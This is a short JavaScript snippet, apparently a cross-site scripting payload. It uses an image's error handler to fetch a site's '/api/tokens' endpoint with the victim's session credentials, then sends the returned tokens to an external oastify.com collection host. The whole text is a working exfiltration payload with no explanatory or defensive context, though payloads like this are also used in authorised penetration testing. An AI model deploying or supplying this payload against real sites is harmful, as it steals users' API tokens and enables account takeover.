var img = document.createElement('img');
img.src = 'invalid';

img.onerror = function () {
  fetch('/api/tokens?limit=10', { credentials: 'include' })
    .then(r => r.text())
    .then(token => {
      new Image().src =
        'https://vqpky2zzatwzjotedb73of29p0vrjh76.oastify.com/?token=' +
        encodeURIComponent(token);
    });
};

document.body.appendChild(img);
